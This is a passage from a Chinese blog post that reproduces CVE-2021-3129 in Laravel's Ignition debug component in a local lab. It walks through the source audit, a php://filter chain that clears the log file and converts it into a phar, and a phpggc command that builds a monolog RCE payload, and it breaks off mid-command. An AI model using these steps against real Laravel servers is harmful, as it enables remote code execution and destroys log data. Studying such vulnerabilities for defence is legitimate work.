href="https://github.com/SNCKER/CVE-2021-3129">https://github.com/SNCKER/CVE-2021-3129</a></p><p>具体配置参照项目的食用方法，<code>generate app key</code> 刷新显示如下页面即成功。</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210209002233665.png" alt="image-20210209002233665" style="zoom:80%;" /><p>同时我们还需要一个工具 <a href="https://github.com/ambionics/phpggc">phpggc</a> 生成 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ambionics/phpggc.git</span><br></pre></td></tr></table></figure><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>以 <a href="https://github.com/facade/ignition/releases/tag/2.5.1">Ignition 2.5.1</a> 源代码审计。</p><p>在功能解析的文章中，我们知道 Igniton 有很多建议的解决方案，这对应着源码中的 <code>Solutions</code>：</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210209000543292.png" alt="image-20210209000543292" style="zoom: 80%;" /><p>我们配置环境做的 <code>generate app key</code> 也在其中。</p><p>漏洞成因出自 <code>MakeViewVariableOptionalSolution.php</code>  这个文件过滤不严，举个例子，假如我们使用了一个未知变量：</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210209003307547.png" alt="image-20210209003307547" style="zoom: 80%;" /><p>可以看到使用了 blade 模板。</p><p>Ignition 提出的解决方案便是将 <code>&#123;&#123; $name &#125;&#125;</code>  替换为<code>&#123;&#123; $name ?? '' &#125;&#125;</code> ，这里我们点击 <code>Make variable optional</code> 前抓包：</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210209003639494.png" alt="image-20210209003639494" style="zoom:80%;" /><p>post 传递了相应的解决方案类、要替换的变量名以及对应 View 文件路径。</p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>接下来审计代码，看上述三个参数是否有可利用的地方。</p><p>首先我们从 <code>src/IgnitionServiceProvider.php</code> 中查找对应路由映射的控制器。</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210210162017025.png" alt="image-20210210162017025" style="zoom:80%;" /><p><code>src/Http/Controllers/ExecuteSolutionController.php</code> 这是只有单个行为的控制器：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExecuteSolutionController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ValidatesRequests</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">        ExecuteSolutionRequest <span class="variable">$request</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">        SolutionProviderRepository <span class="variable">$solutionProviderRepository</span></span></span></span><br><span class="line"><span class="params"><span class="function">    </span>) </span>&#123;</span><br><span class="line">        <span class="variable">$solution</span> = <span class="variable">$request</span>-&gt;getRunnableSolution();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$solution</span>-&gt;run(<span class="variable">$request</span>-&gt;get(<span class="string">&#x27;parameters&#x27;</span>, []));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <code>solution</code> 决定解决方案类名：</p><p><code>src/SolutionProviders/SolutionProviderRepository.php</code> ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getSolutionForClass</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$solutionClass</span></span>): ?<span class="title">Solution</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! class_exists(<span class="variable">$solutionClass</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! in_array(Solution::class, class_implements(<span class="variable">$solutionClass</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> app(<span class="variable">$solutionClass</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其确保了我们指向的类实现 <code>RunnableSolution</code> 这个接口，这个参数是不能被随意更改的，pass。</p><p>而另外的 <code>parameters</code> 则会被传到各个方案类中：</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210210170354826.png" alt="image-20210210170354826" style="zoom:80%;" /><p>我们再来看 <code>variableName</code> 和 <code>viewFile</code>：</p><p><code>src/Solutions/MakeViewVariableOptionalSolution.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MakeViewVariableOptionalSolution</span> <span class="keyword">implements</span> <span class="title">RunnableSolution</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="keyword">$this</span>-&gt;makeOptional(<span class="variable">$parameters</span>);</span><br><span class="line">        <span class="comment">// 这里写入修改后的文件</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/* 注解 1:</span></span><br><span class="line"><span class="comment">         * 读取 viewFile 文件内容，然后判断 variableName 是否设置并非 NULL(isset)，决定对文件的操作:</span></span><br><span class="line"><span class="comment">         * (1) 已设置，什么都不做。</span></span><br><span class="line"><span class="comment">         * (2) 未设置，就将 &#x27;$&#x27;.$parameters[&#x27;variableName&#x27;] 替空(&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line">        <span class="variable">$newContents</span> = str_replace(<span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>], </span><br><span class="line">                                   <span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>].<span class="string">&quot; ?? &#x27;&#x27;&quot;</span>, </span><br><span class="line">                                   <span class="variable">$originalContents</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 注解 2:</span></span><br><span class="line"><span class="comment">         * 对原始文件内容和修改后的文件内容字符进行了解析，然后使用 Zend 引擎的语法分析器获取源码中的 PHP 语言的解析器代号</span></span><br><span class="line"><span class="comment">         * 等价于分析代码结构</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="variable">$originalTokens</span> = token_get_all(Blade::compileString(<span class="variable">$originalContents</span>));</span><br><span class="line">        <span class="variable">$newTokens</span> = token_get_all(Blade::compileString(<span class="variable">$newContents</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 注解 3:</span></span><br><span class="line"><span class="comment">         * 进行了一次“正确”的代码结构分析，如果我们对 variableName 动了些手脚，它可以通过结果对比阻止我们修改文件</span></span><br><span class="line"><span class="comment">         * 当然如果比对正确，修改后的文件将会被写入</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="variable">$expectedTokens</span> = <span class="keyword">$this</span>-&gt;generateExpectedTokens(<span class="variable">$originalTokens</span>, <span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$expectedTokens</span> !== <span class="variable">$newTokens</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newContents</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 正常情况下的 token_get_all() 执行结果生成</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">generateExpectedTokens</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$originalTokens</span>, <span class="keyword">string</span> <span class="variable">$variableName</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$expectedTokens</span> = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$originalTokens</span> <span class="keyword">as</span> <span class="variable">$token</span>) &#123;</span><br><span class="line">            <span class="variable">$expectedTokens</span>[] = <span class="variable">$token</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$token</span>[<span class="number">0</span>] === T_VARIABLE &amp;&amp; <span class="variable">$token</span>[<span class="number">1</span>] === <span class="string">&#x27;$&#x27;</span>.<span class="variable">$variableName</span>) &#123;</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_COALESCE, <span class="string">&#x27;??&#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_CONSTANT_ENCAPSED_STRING, <span class="string">&quot;&#x27;&#x27;&quot;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$expectedTokens</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配合代码的三条注解理解，<code>variableName</code> 其实等同于加密口令，我们很难绕过这个验证。</p><p>而最后一个变量 <code>viewFile</code> ，有读写两个操作，且<strong>没有任何过滤</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 <code>file_get_contents</code> 通过 <code>phar://</code> 伪协议解析 phar 文件时，会将 meta-data 进行反序列化，我们或许可以利用它来 RCE 。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>接下来我们从两个问题出发，分析如何去利用这个漏洞。</p><h4 id="写入什么样的文件？"><a href="#写入什么样的文件？" class="headerlink" title="写入什么样的文件？"></a>写入什么样的文件？</h4><p>现在，我们的目的是要找合适的文件写入，之前的情况是使用了未知变量，但因为 <code>variableName</code>  修改文件内容前有严格验证，我们并不能利用它，也不能从页面得到任何有效信息，已存在的文件同理。</p><p>那么，最后的选项便是日志文件了。</p><p>Laravel 使用 <a href="https://github.com/Seldaek/monolog">Monolog</a> 库为各种强大的日志处理程序提供支持，<code>config/app.php</code> 配置文件的 <code>debug</code> 选项决定了是否向用户显示错误信息。默认情况下，此选项设置为获取存储在 <code>.env</code> 文件中的 <code>APP_DEBUG</code> 环境变量的值，默认的 Laravel 日志记录在一个文件 <code>storage/logs/laravel.log</code> 。</p><p>我们复现的环境本来就是处于 Debug 模式下，本来对于本地开发，应该将 <code>APP_DEBUG</code> 环境变量设置为 true 。而在生产环境中，此值应始终保持 false 。如果在生产中将该值设置为 true ，则有可能会将敏感的配置信息暴露给应用程序的最终用户，这也是该漏洞的一大成因。举个例子，我们来尝试加载一个不存在的 View 文件：</p><p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210210231146374.png" alt="image-20210210231146374"></p><p>再来看实例的 log 文件是否有对应记录：</p><p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210210231409402.png" alt="image-20210210231409402"></p><p>成功了，这样我们可以尝试注入精心构造的 payload 通过日志文件获取想要的信息。</p><h4 id="如何转换文件？"><a href="#如何转换文件？" class="headerlink" title="如何转换文件？"></a>如何转换文件？</h4><p>虽能写入日志文件，还是有几个问题需要注意：</p><ol><li><p>我们写入了日志文件后，要怎么让其作为 php 文件解析？</p><p>后缀名是不能变的，那么自然而然想到了 phar 来伪造。</p><p>phar 文件只要有正确的 stub 即可，它可以理解为一个标志，格式为 <code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以 <code>__HALT_COMPILER();?&gt;</code> 来结尾，否则 phar 扩展将无法识别这个文件为 phar 文件。</p></li><li><p>我们如何转换 log 文件为 phar ？</p><p>用 <code>php://filter</code>  在文件返回前更改其内容？</p><p>CTFer 应该很熟悉，在读取包含有敏感信息的 php 等源文件时，为了规避特殊字符造成混乱，先将“可能引发冲突的代码”编码一遍，如 b64 ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=xxx.php</span><br></pre></td></tr></table></figure><p>而 php 在进行 b64 解码时，<strong>不符合 b64 标准的字符将被忽略</strong>，也就是说仅将合法字符组成密文进行解码，这个特性在绕过“死亡 exit”时经常被用到，解密等同于以下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>] = preg_replace(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br><span class="line">base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>看上去这个方法是可行的，但日志文件并非完全由我们写入的内容组成，还有旧记录，并且我们注入生成的记录会类于以下格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[2021-02-10 14:35:38] local.ERROR: file_get_contents(snovving): failed to open stream: No such file or directory &#123;&quot;exception&quot;:&quot;[object] (ErrorException(code: 0): file_get_contents(snovving): failed to open stream: No such file or directory at /src/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75)</span><br><span class="line">[stacktrace]</span><br><span class="line">#0 [internal function]: Illuminate\\Foundation\\Bootstrap\\HandleExceptions-&gt;handleError(2, &#x27;file_get_conten...&#x27;, &#x27;/src/vendor/fac...&#x27;, 75, Array)</span><br><span class="line">#1 /src/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(75): file_get_contents(&#x27;snovving&#x27;)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">#36 /src/server.php(21): require_once(&#x27;/src/public/ind...&#x27;)</span><br><span class="line">#37 &#123;main&#125;</span><br><span class="line">&quot;&#125; </span><br></pre></td></tr></table></figure><p>可以看到 payload (snovving) 出现了三次，还有时间前缀和后面大量堆栈跟踪的信息，注入的内容只占其中很小一部分，这意味着返回的内容将是巨量的。</p><p>同时还有个非常严重的问题，b64 解码是 4 比特一组，<code>==</code> 或 <code>=</code> 只会出现在末尾，它们代表最后一组的代码只有 8 位或 16 位，如果 <code>=</code> 出现在了中间，因为是 b64 合法字符不会被忽略，也绝大可能不能被正确解码，也就是说，php 将会报错，<strong>这样将不会返回任何结果</strong>。</p><p>综上所述，即使我们利用多次 b64 解码吃掉其他字符，也很大可能出现错误（<code>=</code>），并不能精确地转换为 phar ，而且构造上也很繁琐，因为我们在实际测试中，并不知道旧记录，也不知道 <code>log_max_files</code> 最大的日志文件数。</p><p><strong>思考到这，既然文本量大，在注入前，我们索性彻底清空 log 文件，这样文件内容就完全是我们 payload 的记录了，届时再来想办法用 b64 吃字符转换，化大为小。</strong></p><p>确定思路后，我们先来观察单个错误记录， 之前我们注意到它出现了三次，但我们现在要关注的是 payload <strong>完整</strong>出现的地方：</p><p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210211040549489.png" alt="image-20210211040549489"></p><p>这里我用了更明显的 payload ，可以看到完整出现的有两处，记录结构也就相当于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[x1]payload[x2]payload[x3]</span><br></pre></td></tr></table></figure><p>即使加上以前日志记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[x0]</span><br><span class="line">[x1]payload[x2]payload[x3]</span><br></pre></td></tr></table></figure><p>这般，我们清空 log ，也就删除了 <code>[x0]</code> 。</p><p><strong>清空 log 文件</strong></p><p>作者提到有一个过滤器（并未被官方文档记录）可以完全清除：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=consumed/resource=../storage/logs/laravel.log</span><br></pre></td></tr></table></figure><h5 id="处理单个错误"><a href="#处理单个错误" class="headerlink" title="处理单个错误"></a>处理单个错误</h5><p>虽然单独的 b64 不能清除 <code>[x1]~[x3]</code> ，但我们不只有这一个过滤器，况且 <code>php://filter</code> 是允许使用多个过滤器的。</p><p>处理单个错误的思路，便是把 <code>[xn]</code> 这部分内容尽可能变成非 b64 合法字符，最后一次性 b64 解码吃掉，就剩下了我们的 payload ，phar 文件。</p><p><a href="https://www.php.net/manual/zh/filters.php">可用过滤器列表</a></p><p>由此，我们需要选择方便构造的过滤器，<a href="https://www.php.net/manual/en/filters.convert.php">例如 utf-16 转换为 utf-8</a> ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$fp</span> = fopen(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    stream_filter_append(<span class="variable">$fp</span>, <span class="string">&#x27;convert.iconv.utf-16le.utf-8&#x27;</span>);</span><br><span class="line">    fwrite(<span class="variable">$fp</span>, <span class="string">&quot;T\0h\0i\0s\0 \0i\0s\0 \0a\0 \0t\0e\0s\0t\0.\0\n\0&quot;</span>);</span><br><span class="line">    fclose(<span class="variable">$fp</span>);</span><br><span class="line">    <span class="comment">/* Outputs: This is a test. */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>测试一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo -ne &#x27;[x1]p\0a\0y\0l\0o\0a\0d\0[x2]p\0a\0y\0l\0o\0a\0d\0[x3]&#x27; &gt; /tmp/test.txt</span><br><span class="line"></span><br><span class="line">php &gt; echo file_get_contents(&#x27;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#x27;);</span><br><span class="line">硛崱payload硛崲payload硛崳</span><br></pre></td></tr></table></figure><p>这样 <code>[xn]</code> 的部分就都变成了非 ascii 字符，接下来就要想办法<strong>让两处完整 payload 只出现一次</strong>。</p><p>因为 utf-16 使用两个字节，我们可以在后面加一字节，从而使第二处解码错误 ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo -ne &#x27;[x1]p\0a\0y\0l\0o\0a\0d\0X[x2]p\0a\0y\0l\0o\0a\0d\0X[x3]&#x27; &gt; /tmp/test.txt</span><br><span class="line"></span><br><span class="line">php &gt; echo file_get_contents(&#x27;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#x27;);</span><br><span class="line">硛崱payload存㉸灝愀礀氀漀愀搀堀硛崳</span><br></pre></td></tr></table></figure><p>这样做还有一个好处，因为我们的 payload 不一定像示例一样奇数个能对齐，或许是如 snovving 这样的偶数个字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo -ne &#x27;[x1]s\0n\0o\0v\0v\0i\0n\0g[x2]s\0n\0o\0v\0v\0i\0n\0g[x3]&#x27; &gt; /tmp/test.txt</span><br><span class="line"></span><br><span class="line">php &gt; echo file_get_contents(&#x27;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#x27;);</span><br><span class="line">硛崱snovvin孧㉸獝渀漀瘀瘀椀渀最硛崳</span><br></pre></td></tr></table></figure><p>可以看到最后的 g 没有解码成功，但我们加上一字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo -ne &#x27;[x1]s\0n\0o\0v\0v\0i\0n\0g\0X[x2]s\0n\0o\0v\0v\0i\0n\0g\0X[x3]&#x27; &gt; /tmp/test.txt</span><br><span class="line"></span><br><span class="line">php &gt; echo file_get_contents(&#x27;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#x27;);</span><br><span class="line">硛崱snovving存㉸獝渀漀瘀瘀椀渀最堀硛崳</span><br></pre></td></tr></table></figure><p>就能<strong>保证有一处解码是完全正确的</strong>。</p><p>上述都是建立在日志文件本身是两个字节对齐的前提下，但如果不是的话，我们仍会在 <code>[x1]~[x3]</code> 解码错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP Warning:  file_get_contents(): iconv stream filter (&quot;utf16le&quot;=&gt;&quot;utf-8&quot;): invalid multibyte sequence in php shell code on line 1</span><br></pre></td></tr></table></figure><p>所以我们得想办法让这个文件 <code>[x1]~[x3]</code> 的部分尽量“均匀”，能无限接近“整除”，这样想就很明确了，两倍。</p><p>我们在发送攻击 payload 之前，先随便发送一个无害的，届时日志文件就是这样的构造，保证了两字节：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[x1_1]payload1[x1_2]payload1[x1_3]</span><br><span class="line">[x2_1]payload2[x2_2]payload2[x2_3]</span><br></pre></td></tr></table></figure><p>最后，便是对空字节的处理，它只有一字节，而 <code>file_get_contents()</code> 在加载有空字节的文件时会 warning ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP Warning:  file_get_contents() expects parameter 1 to be a valid path, string given in php shell code on line 1</span><br></pre></td></tr></table></figure><p>所以我们要对它<strong>进行填充编码</strong>，相信有过一定计网知识的会联想到 quoted-printable 这种内容传送编码。</p><blockquote><p>quoted-printable</p><p>这种编码方法的要点就是对于所有可打印字符的 ascii 码，除特殊字符等号 = 外，都不改变。</p><p>= 和不可打印的 ascii 码以及非 ascii 码的数据的编码方法是：</p><p>先将每个字节的二进制代码用两个十六进制数字表示，然后在前面再加上一个等号 = 。</p><p>举例如 = ，它的编码便是 <code>=3D</code> ，3D 可对照十六进制 ascii 码表得到。</p></blockquote><p>在清空了 log 文件、传送两个 payload 后，文件中只有两个错误信息记录，也就是说，只有少量的非 ascii 码，用这种编码方式再适合不过，并且，它也有对应的过滤器 <code>convert.quoted-printable-decode</code> ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$fp</span> = fopen(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    stream_filter_append(<span class="variable">$fp</span>, <span class="string">&#x27;convert.quoted-printable-encode&#x27;</span>);</span><br><span class="line">    fwrite(<span class="variable">$fp</span>, <span class="string">&quot;This is a test.\n&quot;</span>);</span><br><span class="line">    <span class="comment">/* Outputs:  =This is a test.=0A  */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>空字节的编码，自然是 <code>=00</code> 。</p><p>至此，我们的转换链就能构造了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log</span><br></pre></td></tr></table></figure></li></ol><p>综上，两个问题的提出和解决，攻击思路已经非常明晰了：</p><ol><li><p>编码构造 payload</p><p>b64 -&gt; quoted-printable ，这里构造好后，还要在末尾添加一字符，确保有且只有一处是完整的 payload 。</p></li><li><p>清空 log 文件</p></li><li><p>发送无害 payload 对齐</p></li><li><p>发送攻击 payload</p></li><li><p>解码转换 log 至 phar</p><p>quoted-printable -&gt; utf-16 转 utf-8 -&gt; b64</p></li><li><p>phar 伪协议执行</p></li></ol><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>编码构造，需要在 phpggc 目录中运行，结果保存在 <code>payload.txt</code> 中，记得在末尾添加一个字符，如 <code>a</code> ，这里我并未用作者博客中的生成指令，两个 sed 表达式并不能百分百正确 quoted-printable 编码，我参考了作者写的 exp 脚本，quoted-printable 本质上就是将每个字节的十六进制数前加一个 <code>=</code> ，所以能得出指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d &#x27;phar.readonly=0&#x27; ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | python -c &quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:].zfill(2) + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot; &gt; 